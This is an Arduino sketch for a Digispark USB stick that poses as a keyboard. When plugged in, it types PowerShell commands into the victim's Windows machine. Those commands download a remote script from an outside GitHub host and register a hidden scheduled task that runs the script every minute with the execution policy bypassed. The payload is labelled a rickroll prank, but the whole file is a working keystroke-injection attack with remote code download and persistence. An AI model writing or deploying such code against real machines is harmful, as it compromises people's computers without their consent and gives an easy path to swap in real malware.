// rickroll with task schedule

#include "DigiKeyboard.h"

void setup() {}

void loop() {
  DigiKeyboard.sendKeyStroke(0);
  DigiKeyboard.delay(1000);
  DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
  DigiKeyboard.delay(100);
  DigiKeyboard.print("powershell");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(500);
  DigiKeyboard.print("(New-Object System.Net.WebClient).DownloadFile(\"https://raw.githubusercontent.com/ShiroNexo/test/main/RickRoll_Schedule/rickroll.ps1\", \"C:\\System\\rickroll.ps1\")");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(2000);
  // /SC — defines the schedule for the task. Options available, include MINUTE, HOURLY, DAILY, WEEKLY, MONTHLY, ONCE, ONSTART, ONLOGON, ONIDLE, and ONEVENT.
  // defines the time to run the task (in 24 hours format).
  DigiKeyboard.print("schtasks /create /tn \"RickRoll\" /SC MINUTE /st 13:00 /tr \"powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -Command '& C:\\System\\rickroll.ps1'\"");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(50);
  DigiKeyboard.print("exit");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  for (;;) {
    /*empty*/
  }

}
